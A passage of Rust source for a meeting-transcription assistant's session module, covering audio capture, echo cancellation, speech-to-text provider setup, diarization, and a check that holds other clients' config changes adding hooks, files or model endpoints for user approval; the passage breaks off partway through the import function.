//! The session: the socket, the overlay and one capture pipeline per saved config.

use std::collections::{BTreeSet, HashMap};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use anyhow::{Result, bail};
use futures::future::{BoxFuture, try_join_all};
use serde_json::{Value, json};
use tokio::sync::{OnceCell, Semaphore, mpsc, watch};
use tokio::task::{JoinHandle, JoinSet};

use crate::adapters::audio_file::WavFileSource;
use crate::adapters::audio_pipewire::PipeWireSource;
use crate::adapters::control_socket::{Clients, ControlSocket};
use crate::adapters::diarizer_process;
use crate::adapters::echo_cancel;
use crate::adapters::hook_shell::ShellHooks;
use crate::adapters::http::Endpoint;
use crate::adapters::llm_openai::{OpenAIChat, Unavailable, list_models};
use crate::adapters::omapass;
use crate::adapters::overlay;
use crate::adapters::people_files::PeopleFiles;
use crate::adapters::pipewire_devices::{Device, list_devices};
use crate::adapters::session_files::{NoSessionFiles, SessionFiles};
use crate::adapters::stt_deepgram::{self, DeepgramBilling, DeepgramTranscriber};
use crate::adapters::stt_elevenlabs::{self, ElevenLabsTranscriber};
use crate::adapters::stt_openai::OpenAITranscriber;
use crate::adapters::terminal::terminal;
use crate::adapters::vad_silero::{SileroModel, SileroVad};
use crate::adapters::webvtt;
use crate::config::{self, Config, ConfigError, Key, ModelConfig, ModelType};
use crate::domain::assistant::{Assistant, ContextSlot, Emit, Model, Reviewer, Setup, Translating};
use crate::domain::channel::{
    Captured, CapturedStream, Listeners, Transcriber, Utterance, capture_channel, monitor_channel,
    transcribe,
};
use crate::domain::events::{error, transcription_failed};
use crate::domain::hub::{Capture, Hub};
use crate::domain::segmenter::{Segment, SegmenterConfig};
use crate::domain::transcribers::{Listening, Transcribers};
use crate::import;
use crate::ports::{
    AudioError, AudioSource, LanguageModel, PeopleStore, SessionLog, SpeechToText,
    StreamingSpeechToText, TranscriptionBilling,
};

/// The longest the assistant's model may send nothing before the request fails.
const LLM_SILENCE: Duration = Duration::from_secs(120);

/// One audio stream being captured, the participant it is heard as, and its colour.
pub struct Input {
    pub id: String,
    pub label: String,
    pub participant: String,
    /// Heard as the user: their voice is not told apart from others'.
    pub user: bool,
    pub color: Option<String>,
    pub source: Box<dyn AudioSource>,
    /// The same microphone with the others' audio cancelled, used while a session
    /// records when echo cancellation is on.
    pub cancelled: Option<Box<dyn AudioSource>>,
}

/// One input per configured device; devices that are not connected are reported and skipped.
pub fn inputs(
    config: &Config,
    replay: Option<&Path>,
    devices: &[Device],
    emit: &Emit,
) -> Vec<Input> {
    if let Some(replay) = replay {
        let participant = config
            .participants
            .iter()
            .find(|p| !p.user)
            .map_or("replay", |p| &p.name);
        let label = replay.file_name().unwrap_or_default().to_string_lossy();
        return vec![Input {
            id: "replay".into(),
            label: label.into(),
            participant: participant.into(),
            user: false,
            color: None,
            source: Box::new(WavFileSource::new(replay.into(), true)),
            cancelled: None,
        }];
    }
    let mut inputs: Vec<Input> = Vec::new();
    for participant in &config.participants {
        for device_id in &participant.devices {
            match devices.iter().find(|d| &d.id == device_id) {
                Some(device) => {
                    // Echo cancellation runs on one microphone: the user's first.
                    let cancels = config.audio.echo_cancel
                        && participant.user
                        && device.kind == "input"
                        && inputs.iter().all(|input| input.cancelled.is_none());
                    let cancelled = cancels.then(|| {
                        let node = Device::new(&echo_cancel::source_node(), "eco", "input");
                        Box::new(PipeWireSource::new(&node)) as Box<dyn AudioSource>
                    });
                    inputs.push(Input {
                        id: device.id.clone(),
                        label: device.label.clone(),
                        participant: participant.name.clone(),
                        user: participant.user,
                        color: config.colors.get(&device.id).cloned(),
                        source: Box::new(PipeWireSource::new(device)),
                        cancelled,
                    });
                }
                None => emit(error(
                    "input.disconnected",
                    format!("{}: {device_id} is not connected", participant.name),
                    json!({"participant": participant.name, "device": device_id}),
                )),
            }
        }
    }
    inputs
}

/// What runs on the inputs: capture and transcribe for what the recording
/// sessions listen with, or only measure, for `None`.
pub trait Work: Send {
    fn run(
        &mut self,
        listening: Option<watch::Receiver<BTreeSet<Listening>>>,
    ) -> BoxFuture<'_, Result<(), AudioError>>;
}

/// A registered transcription model, ready: a streaming provider for its WebSocket
/// URL, the OpenAI-compatible endpoint otherwise.
pub enum Stt {
    Segments(Box<dyn SpeechToText>),
    Stream(Box<dyn StreamingSpeechToText>),
}

/// A provider's key from where its section says: a variable, or omapass.
async fn api_key(key: Key<'_>) -> Result<Option<String>, String> {
    match key {
        Key::None => Ok(None),
        Key::Env(name) => config::env_key(name).map(Some).map_err(|e| e.0),
        Key::Omapass(account) => omapass::secret(account).await.map(Some),
    }
}

impl Stt {
    /// The transcriber for live audio, or for a `file` — Deepgram streams only
    /// as fast as the audio plays, so a file goes to it segment by segment.
    async fn build(stt: &ModelConfig, language: &str, file: bool) -> Result<Self, String> {
        let key = api_key(stt.key()).await?;
        let base = stt.base_url.trim_end_matches('/');
        if !(base.starts_with("ws://") || base.starts_with("wss://")) {
            let timeout = Duration::from_secs(30);
            let endpoint = Endpoint::new(base, key, timeout).map_err(|e| e.0)?;
            let stt = OpenAITranscriber::new(endpoint, &stt.model, language);
            return Ok(Self::Segments(Box::new(stt)));
        }
        if base.contains("deepgram.com") {
            let deepgram = DeepgramTranscriber::new(base, &stt.model, language, key);
            return Ok(if file {
                Self::Segments(Box::new(deepgram))
            } else {
                Self::Stream(Box::new(deepgram))
            });
        }
        if base.contains("elevenlabs.io") {
            let scribe = ElevenLabsTranscriber::new(base, &stt.model, language, key);
            return Ok(Self::Stream(Box::new(scribe)));
        }
        Err(format!("no streaming transcription known at {base}"))
    }

    fn transcriber(&self) -> Transcriber<'_> {
        match self {
            Self::Segments(stt) => Transcriber::Segments(stt.as_ref()),
            Self::Stream(stt) => Transcriber::Stream(stt.as_ref()),
        }
    }
}

/// What tells the cost of a transcription model's requests, when its provider
/// reports it and its key can be had: Deepgram's.
async fn billing(stt: &ModelConfig) -> Option<Arc<dyn TranscriptionBilling>> {
    if !stt.base_url.contains("deepgram.com") {
        return None;
    }
    let key = api_key(stt.key()).await.ok()??;
    let base = stt.base_url.trim_end_matches('/');
    Some(Arc::new(DeepgramBilling::new(base, key)))
}

/// A transcription model in one language, built the first time it is needed —
/// or why it could not be had.
type Ready = Arc<OnceCell<Result<Stt, String>>>;

/// Every transcription model in every language asked for so far: each built
/// once, for the pipeline's life.
#[derive(Clone, Default)]
struct Built(Arc<Mutex<HashMap<Listening, Ready>>>);

impl Built {
    fn cell(&self, listening: &Listening) -> Ready {
        let mut built = self.0.lock().expect("not poisoned");
        Arc::clone(built.entry(listening.clone()).or_default())
    }
}

/// The registered transcription models, by name.
type Models = Arc<HashMap<String, ModelConfig>>;

/// The model `listening` names, built in its language.
async fn build(models: &Models, listening: &Listening) -> Result<Stt, String> {
    let name = &listening.model;
    let stt = match models.get(name) {
        Some(model) => Stt::build(model, &listening.language, false).await,
        None => Err("not a registered transcription model".into()),
    };
    stt.map_err(|reason| format!("{name}: {reason}"))
}

struct Channels {
    inputs: Vec<Input>,
    models: Models,
    built: Built,
    assistant: Assistant,
    emit: Emit,
    vad: SileroModel,
}

/// One transcriber: an input's audio read from the hub by one model in one
/// language, each line going to every recording session listening with it.
/// It reads from when it starts, so what is said while its model is built
/// waits for it; a model that cannot be had is told, and the sessions only
/// measure.
fn transcriber(
    who: String,
    reader: CapturedStream<'static>,
    (models, cell): (Models, Ready),
    from: Listening,
    assistant: Assistant,
    emit: Emit,
    lines: Option<Arc<Mutex<Vec<HeardLine>>>>,
) -> BoxFuture<'static, ()> {
    Box::pin(async move {
        let built = cell.get_or_init(|| async {
            let built = build(&models, &from).await;
            if let Err(reason) = &built {
                emit(error(
                    "stt.unavailable",
                    format!("transcription: {reason}"),
                    json!({"detail": reason}),
                ));
            }
            built
        });
        let Ok(stt) = built.await else {
            return;
        };
        let utterance = |utterance: Utterance| {
            let start = utterance.phrases.first().map_or(0.0, |p| p.start);
            let end = utterance.end();
            for (session, at) in assistant.hear(&from, &utterance) {
                if let Some(lines) = &lines {
                    let line = HeardLine {
                        session,
                        at,
                        start,
                        end,
                    };
                    lines.lock().expect("not poisoned").push(line);
                }
            }
        };
        let failure = |who: &str, detail: &str| emit(transcription_failed(who, detail));
        let partial = |words: String| assistant.hear_partial(&from, &who, &words);
        let bills = assistant.bills(&from);
        let request = |id: String| bills.opened(id);
        let billed = |id: String, seconds: f64| assistant.billed_segment(&from, &id, seconds);
        let listeners = Listeners {
            utterance: &utterance,
            failure: &failure,
            partial: &partial,
            request: &request,
            billed: &billed,
        };
        transcribe(&who, reader, stt.transcriber(), &listeners).await;
    })
}

impl Work for Channels {
    fn run(
        &mut self,
        listening: Option<watch::Receiver<BTreeSet<Listening>>>,
    ) -> BoxFuture<'_, Result<(), AudioError>> {
        Box::pin(async move {
            let Channels {
                inputs,
                models,
                built,
                assistant,
                emit,
                vad,
            } = self;
            let recording = listening.is_some();
            // While a session records, the user's microphone may be echo-cancelled;
            // the module lives as long as this run.
            let microphone = inputs
                .iter()
                .find(|i| i.cancelled.is_some())
                .map(|i| i.id.clone());
            let echo = match microphone.filter(|_| recording) {
                Some(mic) => match echo_cancel::start(&mic).await {
                    Ok(module) => Some(module),
                    Err(failure) => {
                        let detail = failure.0;
                        emit(error(
                            "echo_cancel.failed",
                            detail.clone(),
                            json!({"detail": detail}),
                        ));
                        None
                    }
                },
                None => None,
            };
            let cancelling = echo.is_some();
            let (emit, assistant, vad) = (&*emit, &*assistant, &*vad);
            // Each input is captured once, into the hub its transcribers read.
            let mut hub = Hub::default();
            let captures: Vec<Capture> = inputs.iter().map(|i| hub.input(&i.id)).collect();
            // The voices of the others' inputs are told apart while they record.
            let voices: Vec<Option<Voices>> = inputs
                .iter()
                .map(|input| {
                    let others = !input.user && recording;
                    others
                        .then(|| voices(assistant, emit, &input.participant))
                        .flatten()
                })
                .collect();
            type Heard = (String, Option<Arc<Mutex<Vec<HeardLine>>>>);
            let heard: HashMap<String, Heard> = inputs
                .iter()
                .zip(&voices)
                .map(|(input, voices)| {
                    let lines = voices.as_ref().map(|voices| Arc::clone(&voices.lines));
                    (input.id.clone(), (input.participant.clone(), lines))
                })
                .collect();
            let channels = inputs.iter_mut().zip(captures).zip(&voices).map(
                |((input, capture), voices)| async move {
                    let source: &mut dyn AudioSource = match input.cancelled.as_mut() {
                        Some(cancelled) if cancelling => &mut **cancelled,
                        _ => &mut *input.source,
                    };
                    let mut vad = SileroVad::new(vad.clone());
                    let mut probability = |frame: &[i16]| {
                        vad.probability(frame)
                            .map_err(|e| AudioError(e.to_string()))
                    };
                    let id = input.id.clone();
                    let signal = move |level: f64, speech: bool| {
                        emit(json!({"type": "signal", "input": id, "level": level, "speech": speech}));
                    };
                    // Outside a session the audio is only measured, never segmented.
                    if !recording {
                        let threshold = SegmenterConfig::default().threshold;
                        return monitor_channel(source, &mut probability, &signal, threshold).await;
                    }
                    let regions = voices.as_ref().map(|voices| voices.regions.clone());
                    // The capture goes with this closure, so its readers end when the source does.
                    let captured = move |captured: Captured| {
                        if let (Some(regions), Captured::Segment(segment, _)) =
                            (&regions, &captured)
                        {
                            let _ = regions.send(segment.clone());
                        }
                        capture.send(captured);
                    };
                    let config = SegmenterConfig::default();
                    capture_channel(source, &mut probability, &signal, config, &captured).await
                },
            );
            let mut captured = std::pin::pin!(try_join_all(channels));
            let Some(mut listening) = listening else {
                return captured.await.map(|_| ());
            };
            let mut transcribers = Transcribers::new(heard.keys().cloned().collect());
            loop {
                let wanted = listening.borrow_and_update().clone();
                transcribers.follow(&wanted, &mut |input, listen| {
                    let (who, lines) = heard[input].clone();
                    let reader = hub.read(input).expect("the hub has every input");
                    let model = (Arc::clone(models), built.cell(listen));
                    let assistant = assistant.clone();
                    transcriber(
                        who,
                        reader,
                        model,
                        listen.clone(),
                        assistant,
                        Arc::clone(emit),
                        lines,
                    )
                });
                tokio::select! {
                    ran = &mut captured => {
                        transcribers.finish().await;
                        drop(echo);
                        return ran.map(|_| ());
                    }
                    changed = listening.changed() => if changed.is_err() {
                        return Ok(());
                    },
                }
            }
        })
    }
}

/// A line a live input became: its session, its time, and where its speech
/// starts and ends in the input, in seconds.
struct HeardLine {
    session: String,
    at: f64,
    start: f64,
    end: f64,
}

/// The voices of one live input, told apart by a child diarizer while it records:
/// its speech goes to the child, never to disk, and each line it became is kept.
struct Voices {
    regions: std::sync::mpsc::Sender<Segment>,
    lines: Arc<Mutex<Vec<HeardLine>>>,
}

/// Start telling the voices heard as `who` apart, when the speaker model is set
/// up; once the input stops recording, the session's lines get their voices.
fn voices(assistant: &Assistant, emit: &Emit, who: &str) -> Option<Voices> {
    let model = config::speaker_model();
    if !model.exists() {
        return None;
    }
    let lines: Arc<Mutex<Vec<HeardLine>>> = Arc::default();
    let (assistant, emit, who) = (assistant.clone(), Arc::clone(emit), who.to_string());
    let heard = Arc::clone(&lines);
    let regions = diarizer_process::spawn(&model, move |found| match found {
        Ok(diarization) => {
            let lines = std::mem::take(&mut *heard.lock().expect("not poisoned"));
            let mut sessions: Vec<&str> = lines.iter().map(|line| line.session.as_str()).collect();
            sessions.sort_unstable();
            sessions.dedup();
            for session in sessions {
                let spans: Vec<(f64, f64, f64)> = lines
                    .iter()
                    .filter(|line| line.session == session)
                    .map(|line| (line.at, line.start, line.end))
                    .collect();
                assistant.voices_heard(session, &who, &spans, &diarization);
            }
        }
        Err(detail) => emit(error(
            "diarization.failed",
            format!("diarization: {detail}"),
            json!({"detail": detail}),
        )),
    });
    Some(Voices { regions, lines })
}

/// Run `work` capturing for what the recording sessions listen with, or only
/// measuring while none records; it restarts only when that switches, so a
/// session starting beside another never stops a capture.
///
/// The running work is dropped whenever this future is, so a restart never leaves
/// an orphan capture behind — it would keep its pw-record and duplicate every frame
/// and every line. A capture that dies is reported, not left silent.
pub async fn follow_recording(
    mut listening: watch::Receiver<BTreeSet<Listening>>,
    work: &mut dyn Work,
    emit: &Emit,
) {
    loop {
        let active = !listening.borrow_and_update().is_empty();
        let failure = tokio::select! {
            result = work.run(active.then(|| listening.clone())) => result.err(),
            switched = switches(&mut listening, active) => match switched {
                Ok(()) => continue,
                Err(_) => return,
            },
        };
        if let Some(failure) = failure {
            emit(error(
                "capture.stopped",
                format!("capture stopped: {failure}"),
                json!({"detail": failure.to_string()}),
            ));
        }
        if switches(&mut listening, active).await.is_err() {
            return;
        }
    }
}

/// Wait until some session records while none did (`active` false), or none
/// does any more.
async fn switches(
    listening: &mut watch::Receiver<BTreeSet<Listening>>,
    active: bool,
) -> Result<(), watch::error::RecvError> {
    loop {
        listening.changed().await?;
        if listening.borrow().is_empty() == active {
            return Ok(());
        }
    }
}

/// Stop `previous` and wait until it is gone, so two pipelines never hold the devices.
pub async fn stop(previous: Option<JoinHandle<()>>) {
    if let Some(previous) = previous {
        previous.abort();
        let _ = previous.await;
    }
}

/// Gives the setup back to the assistant however the pipeline ends.
struct Configured {
    assistant: Assistant,
    setup: Arc<Setup>,
}

impl Drop for Configured {
    fn drop(&mut self) {
        self.assistant.release(&self.setup);
    }
}

/// Capture, transcribe and serve actions with one configuration until dropped.
async fn pipeline(
    config: Config,
    assistant: Assistant,
    replay: Option<PathBuf>,
    emit: Emit,
    vad: SileroModel,
) {
    let devices = if replay.is_some() {
        Vec::new()
    } else {
        list_devices().await
    };
    let inputs = inputs(&config, replay.as_deref(), &devices, &emit);
    // Each part stands on its own: one that cannot be set up — a key missing,
    // say — is reported to every client with the setup, and the rest works on.
    let mut problems = Vec::new();
    let unavailable = |code: &str, part: &str, reason: &str| {
        error(code, format!("{part}: {reason}"), json!({"detail": reason}))
    };
    // Each kind transcribes with its own model or the default, built in the
    // configured language now, so a missing key is told with the setup.
    let kind_transcribers: HashMap<String, String> = config
        .kinds
        .iter()
        .map(|kind| (kind.clone(), config.transcriber(kind).name.clone()))
        .collect();
    let transcription_models: HashMap<String, ModelConfig> = config
        .models
        .iter()
        .filter(|model| model.kind == ModelType::Transcription)
        .map(|model| (model.name.clone(), model.clone()))
        .collect();
    let transcription_models = Arc::new(transcription_models);
    let built = Built::default();
    let defaults: BTreeSet<&String> = kind_transcribers
        .values()
        .chain([&config.stt.model])
        .collect();
    for name in defaults {
        let listening = Listening {
            model: name.clone(),
            language: config.stt.language.clone(),
        };
        let cell = built.cell(&listening);
        let ready = cell.get_or_init(|| build(&transcription_models, &listening));
        if let Err(reason) = ready.await {
            problems.push(unavailable("stt.unavailable", "transcription", reason));
        }
    }
    let mut transcription_billing = HashMap::new();
    for (name, model) in transcription_models.iter() {
        if let Some(billing) = billing(model).await {
            transcription_billing.insert(name.clone(), billing);
        }
    }
    let reviewer = config.reviewer.as_ref().filter(|r| r.enabled);
    let kind_chat = |kind: &String| config.model_of_kind(ModelType::Chat, kind);
    // Only the models something uses are built, each once.
    let used = std::iter::once(&config.llm.model)
        .chain(reviewer.map(|r| &r.model))
        .chain(config.actions.iter().filter_map(|a| a.model.as_ref()))
        .chain(config.kinds.iter().filter_map(kind_chat).map(|m| &m.name))
        .chain(
            config
                .kinds
                .iter()
                .map(|kind| &config.translator(kind).name),
        )
        .chain([&config.translator("").name]);
    let mut models: HashMap<String, Model> = HashMap::new();
    for name in used {
        let Some(registered) = config.model(name).filter(|_| !models.contains_key(name)) else {
            continue;
        };
        let llm: Arc<dyn LanguageModel> = match chat_model(registered).await {
            Ok(chat) => Arc::new(chat),
            Err(reason) => {
                let message = format!("model {name}: {reason}");
                problems.push(error(
                    "model.unavailable",
                    message,
                    json!({"name": name, "detail": reason}),
                ));
                Arc::new(Unavailable(reason))
            }
        };
        let id = registered.model.clone();
        // The fields that make requests what they are; a change cancels the answers streaming on it.
        let settings = json!([
            registered.base_url,
            registered.model,
            registered.api_key_env,
            registered.api_key_omapass,
            registered.request_fields()
        ]);
        let settings = settings.to_string();
        models.insert(name.clone(), Model { llm, id, settings });
    }
    // A valid config names a registered assistant model, so it was built.
    let model = models[&config.llm.model].clone();
    let kind_models: HashMap<String, Model> = config
        .kinds
        .iter()
        .filter_map(|kind| Some((kind.clone(), models[&kind_chat(kind)?.name].clone())))
        .collect();
    let routes: serde_json::Map<String, Value> = config
        .kinds
        .iter()
        .map(|kind| {
            let chat = kind_chat(kind).map_or(&config.llm.model, |m| &m.name);
            let used = json!({"transcription": kind_transcribers[kind], "chat": chat});
            (kind.clone(), used)
        })
        .collect();
    let reviewer = reviewer.and_then(|on| {
        Some(Reviewer {
            model: models.get(&on.model)?.clone(),
            prompt: on.prompt.clone(),
            verbose: on.verbose,
        })
    });
    let context = match config.context() {
        Ok(context) => context,
        Err(failure) => {
            problems.push(unavailable(
                "context.unavailable",
                "context",
                &failure.to_string(),
            ));
            String::new()
        }
    };
    let slots = config
        .slot_texts()
        .into_iter()
        .map(|(slot, text)| {
            let text = text.unwrap_or_else(|failure| {
                let part = format!("context {}", slot.name);
                problems.push(unavailable(
                    "context.unavailable",
                    &part,
                    &failure.to_string(),
                ));
                String::new()
            });
            ContextSlot {
                name: slot.name.clone(),
                kinds: slot.kinds.clone(),
                text,
            }
        })
        .collect();
    let translation = Translating {
        model: models[&config.translator("").name].clone(),
        kind_models: config
            .kinds
            .iter()
            .filter(|kind| config.models.iter().any(|m| m.translates.contains(kind)))
            .map(|kind| (kind.clone(), models[&config.translator(kind).name].clone()))
            .collect(),
    };
    let setup = Arc::new(Setup {
        model,
        models,
        kind_models,
        translation,
        routes: Value::Object(routes),
        actions: config.actions.clone(),
        rules: config.rules.clone(),
        reviewer,
        context,
        slots,
        max_context_chars: config.llm.max_context_chars,
        participants: config
            .participants
            .iter()
            .map(|p| (p.name.clone(), p.user))
            .collect(),
        inputs: inputs
            .iter()
            .map(|i| json!({"id": i.id, "label": i.label, "participant": i.participant, "color": i.color}))
            .collect(),
        language: config.stt.language.clone(),
        languages: config.stt.languages.clone(),
        kinds: config.kinds.clone(),
        drop_echoes: config.audio.drop_echoes,
        ui_language: config.ui_language.clone(),
        hide_from_share: config.hide_from_share,
        transcription: kind_transcribers.clone(),
        default_transcription: config.stt.model.clone(),
        transcription_prices: config
            .models
            .iter()
            .filter_map(|m| Some((m.name.clone(), m.price_per_minute?)))
            .collect(),
        transcription_billing,
        problems,
        limit: Arc::new(Semaphore::new(config.llm.concurrency)),
    });
    assistant.configure(Arc::clone(&setup));
    let _configured = Configured {
        assistant: assistant.clone(),
        setup,
    };
    for event in assistant.snapshot() {
        emit(event);
    }
    let mut channels = Channels {
        inputs,
        models: transcription_models,
        built,
        assistant: assistant.clone(),
        emit: Arc::clone(&emit),
        vad,
    };
    // Transcribe only while a session records; otherwise only measure the inputs,
    // so the overlay shows they work.
    follow_recording(assistant.listening(), &mut channels, &emit).await;
}

/// A registered chat model, with its key; why not, when it cannot be had. A
/// local one may read a long context for minutes before its first word.
async fn chat_model(model: &ModelConfig) -> Result<OpenAIChat, String> {
    let key = api_key(model.key()).await?;
    let endpoint = Endpoint::new(&model.base_url, key, LLM_SILENCE).map_err(|e| e.0)?;
    Ok(OpenAIChat::new(endpoint, model.request_fields()))
}

/// A JSON list of names, or `None` when it is not one.
fn names(value: Option<&Value>) -> Option<Vec<String>> {
    let list = value?.as_array()?;
    list.iter()
        .map(|name| name.as_str().map(String::from))
        .collect()
}

/// Split a command line into its verb and the rest, if any.
fn split(command: &str) -> (&str, Option<&str>) {
    match command.split_once(char::is_whitespace) {
        Some((verb, rest)) if !rest.trim().is_empty() => (verb, Some(rest.trim_start())),
        Some((verb, _)) => (verb, None),
        None => (command, None),
    }
}

/// `window.show {"window", "session"}`: the overlay window `window` shows the live
/// session `session` now, or none when it is empty.
fn window_shows(payload: &str) -> Option<(u32, String)> {
    let request = serde_json::from_str::<Value>(payload).ok()?;
    let number = u32::try_from(request.get("window")?.as_u64()?).ok()?;
    let session = request.get("session")?.as_str()?.to_string();
    Some((number, session))
}

/// What a `config.set` leads to: a config to save, or one held until the user
/// confirms it in an eco window, with the `config_pending` event that names why.
enum ConfigChange {
    Adopt(Result<Config, String>),
    Hold(Config, Value),
}

/// A `config.set` carrying the windows' `token` is the user's own and is saved.
/// From any other client, one that adds or changes an action's hook, adds a
/// context file, or adds a model or changes its base_url or key source is held
/// instead: those run commands, send files to a model, and send keys to an address.
fn config_change(current: &Config, token: &str, payload: &str) -> ConfigChange {
    let mut request = match serde_json::from_str::<Value>(payload) {
        Ok(request) => request,
        Err(e) => return ConfigChange::Adopt(Err(e.to_string())),
    };
    let from_window = request
        .as_object_mut()
        .and_then(|fields| fields.remove("token"))
        .is_some_and(|given| given == token);
    let config = match Config::from_value(request) {
        Ok(config) => config,
        Err(e) => return ConfigChange::Adopt(Err(e.0)),
    };
    if from_window {
        return ConfigChange::Adopt(Ok(config));
    }
    let hooks: Vec<Value> = config
        .actions
        .iter()
        .filter(|action| !action.hook.is_empty())
        .filter(|action| {
            !current
                .actions
                .iter()
                .any(|known| known.name == action.name && known.hook == action.hook)
        })
        .map(|action| json!({"action": action.name, "command": action.hook}))
        .collect();
    let files = |config: &Config| -> Vec<String> {
        let slots = config.contexts.iter().flat_map(|slot| slot.files.iter());
        config.context_files.iter().chain(slots).cloned().collect()
    };
    let known = files(current);
    let mut added: Vec<String> = Vec::new();
    for file in files(&config) {
        if !known.contains(&file) && !added.contains(&file) {
            added.push(file);
        }
    }
    // A model's key is sent to its base_url: a new model, or a known one at
    // another address or with another key, is the user's to approve.
    let models: Vec<Value> = config
        .models
        .iter()
        .filter(|model| {
            !current.models.iter().any(|known| {
                known.name == model.name
                    && known.base_url == model.base_url
                    && known.key() == model.key()
            })
        })
        .map(|model| {
            let (env, omapass) = match model.key() {
                Key::None => (None, None),
                Key::Env(name) => (Some(name), None),
                Key::Omapass(account) => (None, Some(account)),
            };
            json!({
                "name": model.name,
                "base_url": model.base_url,
                "api_key_env": env,
                "api_key_omapass": omapass,
            })
        })
        .collect();
    if hooks.is_empty() && added.is_empty() && models.is_empty() {
        return ConfigChange::Adopt(Ok(config));
    }
    let event = json!({"type": "config_pending", "hooks": hooks, "files": added, "models": models});
    ConfigChange::Hold(config, event)
}

/// The `config_pending` event once nothing waits for the user.
fn nothing_pending() -> Value {
    json!({"type": "config_pending", "hooks": [], "files": [], "models": []})
}

struct Session {
    config_path: PathBuf,
    current: Config,
    /// The token every eco window carries; see `config_change`.
    token: String,
    /// A config another client asked for, held for the user, and its
    /// `config_pending` event, which a client that connects is greeted with.
    pending: Arc<Mutex<Option<(Config, Value)>>>,
    replay: Option<PathBuf>,
    vad: SileroModel,
    assistant: Assistant,
    emit: Emit,
    pipeline: Option<JoinHandle<()>>,
    background: JoinSet<()>,
    log: Arc<dyn SessionLog>,
    people: Arc<dyn PeopleStore>,
    /// The file being imported, one at a time.
    importing: Option<JoinHandle<()>>,
}

impl Session {
    async fn restart(&mut self) {
        stop(self.pipeline.take()).await;
        self.pipeline = Some(tokio::spawn(pipeline(
            self.current.clone(),
            self.assistant.clone(),
            self.replay.clone(),
            Arc::clone(&self.emit),
            self.vad.clone(),
        )));
    }

    /// Save the config `change` builds and restart capture with it. A config held
    /// for the user is dropped: it was built from the one replaced.
    async fn adopt(&mut self, change: Result<Config, String>) {
        if change.is_ok() && self.pending.lock().expect("not poisoned").take().is_some() {
            (self.emit)(nothing_pending());
        }
        let saved = change.and_then(|config| {
            config::save(&config, &self.config_path).map_err(|e| e.0)?;
            Ok(config)
        });
        match saved {
            Ok(config) => {
                self.current = config;
                self.restart().await;
                (self.emit)(json!({"type": "config_saved"}));
            }
            Err(failure) => (self.emit)(error(
                "config.invalid",
                format!("config: {failure}"),
                json!({"detail": failure}),
            )),
        }
    }

    /// Start a session of a configured kind (the first one by default) in one of the
    /// configured languages, with the tags given; it is transcribed in it.
    async fn start_session(&mut self, payload: &str) {
        let kinds = &self.current.kinds;
        let request = serde_json::from_str::<Value>(payload)
            .map_err(|e| e.to_string())
            .and_then(|request| {
                let text = |value: &Value| value.as_str().map_or(value.to_string(), String::from);
                let code = request
                    .get("language")
                    .map(text)
                    .ok_or("missing language")?;
                let title = request.get("title").map(text).unwrap_or_default();
                let kind = request.get("kind").map_or_else(|| kinds[0].clone(), text);
                if !kinds.contains(&kind) {
                    return Err(format!("unknown kind {kind:?}"));
                }
                if !self.current.stt.languages.contains(&code) {
                    return Err(format!("no language {code:?}"));
                }
                Ok((
                    title,
                    kind,
                    code,
                    names(request.get("contexts")),
                    names(request.get("tags")).unwrap_or_default(),
                ))
            });
        let (title, kind, code, contexts, tags) = match request {
            Ok(request) => request,
            Err(failure) => {
                (self.emit)(error(
                    "session.invalid",
                    format!("session: {failure}"),
                    json!({"detail": failure}),
                ));
                return;
            }
        };
        let id = self
            .assistant
            .start(&title, &kind, &code, contexts.as_deref());
        for tag in &tags {
            self.assistant.tag(&id, tag, true);
        }
        // The window that asked shows the session it started.
        if let Some(window) = serde_json::from_str::<Value>(payload)
            .ok()
            .and_then(|request| request.get("window").and_then(Value::as_u64))
        {
            (self.emit)(json!({"type": "session_opened", "id": id, "window": window}));
        }
    }

    /// The text fields `keys` of a JSON command, or a session.invalid error shown.
    /// A line of a session: `{"id", "who", "at"}`.
    fn line(&self, payload: &str) -> Option<(String, String, f64)> {
        let [id, who] = self.fields(payload, ["id", "who"])?;
        let at = serde_json::from_str::<Value>(payload)
            .ok()
            .and_then(|request| request.get("at").and_then(Value::as_f64));
        match at {
            Some(at) => Some((id, who, at)),
            None => {
                (self.emit)(error(
                    "session.invalid",
                    String::from("session: missing at"),
                    json!({"detail": "missing at"}),
                ));
                None
            }
        }
    }

    fn fields<const N: usize>(&self, payload: &str, keys: [&str; N]) -> Option<[String; N]> {
        let request = serde_json::from_str::<Value>(payload).map_err(|e| e.to_string());
        let found = request.and_then(|request| {
            let mut values = keys.map(|_| String::new());
            for (value, key) in values.iter_mut().zip(keys) {
                *value = request
                    .get(key)
                    .and_then(Value::as_str)
                    .map(String::from)
                    .ok_or(format!("missing {key}"))?;
            }
            Ok(values)
        });
        found
            .map_err(|failure| {
                (self.emit)(error(
                    "session.invalid",
                    format!("session: {failure}"),
                    json!({"detail": failure}),
                ));
            })
            .ok()
    }

    /// Import a file into a new session: `{"path"}`, and optionally `"title"` (the
    /// file's name), `"kind"` (the first), `"language"` (the current one),
    /// `"participant"` (the user) and `"started_at"`, seconds since the epoch (when
    /// the file says it was recorded).
    fn import(&mut self, payload: &str) {
        let failed = |detail: String| {
            error(
                "import.failed",
                format!("import: {detail}"),
                json!({"detail": detail}),
            )
        };
        if self
            .importing
            .as_ref()
            .is_some_and(|task| !task.is_finished())
        {
            let busy = error("import.busy", "an import is already running", Value::Null);
            return (self.emit)(busy);
        }
        let request = match serde_json::from_str::<Value>(payload) {
            Ok(request) => request,
            Err(e) => {
                let detail = e.to_string();
                let invalid = error(
                    "session.invalid",
                    format!("session: {detail}"),
                    json!({"detail": detail}),
                );
                return (self.emit)(invalid);
            }
        };
        let text = |key: &str| {
            request
                .get(key)
                .and_then(Value::as_str)
                .map(str::trim)
                .filter(|value| !value.is_empty())
                .map(String::from)
        };
        let config = &self.current;
        let Some(path) = text("path").map(PathBuf::from).filter(|p| p.is_file()) else {
            return (self.emit)(failed(format!(
                "no file {:?}",
                text("path").unwrap_or_default()
            )));
        };
        let kind = text("kind").unwrap_or_else(|| config.kinds[0].clone());
        let language = text("language").unwrap_or_else(|| config.stt.language.clone());
        if !config.kinds.contains(&kind) || !config.stt.languages.contains(&language) {
            return (self.emit)(failed(format!(
                "unknown kind {kind:?} or language {language:?}"
            )));
        }
        let speaker = config
            .participants
            .iter()
            .find(|p| p.user)
            .or(config.participants.first());
        let participant = text("participant")
            .or_else(|| speaker.map(|p| p.name.clone()))
            .unwrap_or_else(|| "—".into());
        let title = text("title").unwrap_or_else(|| {
            path.file_stem()
                .unwrap_or_default()
                .to_string_lossy()
